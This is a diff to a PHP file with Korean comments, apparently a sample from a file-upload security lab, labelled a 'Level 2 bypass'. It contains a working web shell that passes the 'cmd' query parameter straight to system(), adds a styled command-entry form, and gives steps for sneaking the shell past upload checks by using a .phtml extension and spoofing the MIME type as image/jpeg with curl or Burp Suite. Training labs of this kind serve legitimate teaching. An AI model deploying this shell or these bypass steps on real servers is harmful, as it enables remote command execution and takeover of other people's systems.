@@ -3,23 +3,41 @@
  * Level 2 우회 샘플 - .phtml 확장자 사용
  *
  * 우회 기법:
- * - .php 확장자만 차단하므로 .phtml 사용
- * - 많은 웹서버가 .phtml도 PHP로 실행
+ * 1. .php 확장자 대신 .phtml 사용
+ * 2. MIME 타입을 image/jpeg 등으로 조작
  *
  * 사용법:
  * 1. 확장자를 .txt에서 .phtml로 변경
- * 2. Level 2 선택 후 업로드
- * 3. 브라우저에서 접근: http://localhost:8080/uploads/shell.phtml?cmd=ls
+ * 2. Level 2 선택
+ * 3. Burp Suite로 Content-Type을 image/jpeg로 변경하거나
+ *    curl로 업로드: curl -F "level=2" -F "file=@shell.phtml;type=image/jpeg" http://localhost:8080/upload.php
+ * 4. 브라우저에서 접근: http://localhost:8080/uploads/shell.phtml?cmd=ls
  */
 
 if (isset($_GET['cmd'])) {
     echo "<pre>";
-    // Level 2는 소문자 system만 차단하므로 대소문자 혼용으로 우회
-    $func = 'sYsTeM';
-    $func($_GET['cmd']);
+    system($_GET['cmd']);
     echo "</pre>";
 } else {
-    echo "Web Shell - Level 2 Bypass<br>";
-    echo "Usage: ?cmd=ls";
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Simple Web Shell</title>
+        <style>
+            body { font-family: monospace; background: #1e1e1e; color: #00ff00; padding: 20px; }
+            input { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 8px; width: 300px; }
+            button { background: #00ff00; color: #000; border: none; padding: 8px 16px; cursor: pointer; }
+        </style>
+    </head>
+    <body>
+        <h2>Web Shell - Level 2 Bypass (.phtml)</h2>
+        <form method="GET">
+            <input type="text" name="cmd" placeholder="Enter command" />
+            <button type="submit">Execute</button>
+        </form>
+    </body>
+    </html>
+    <?php
 }
 ?>
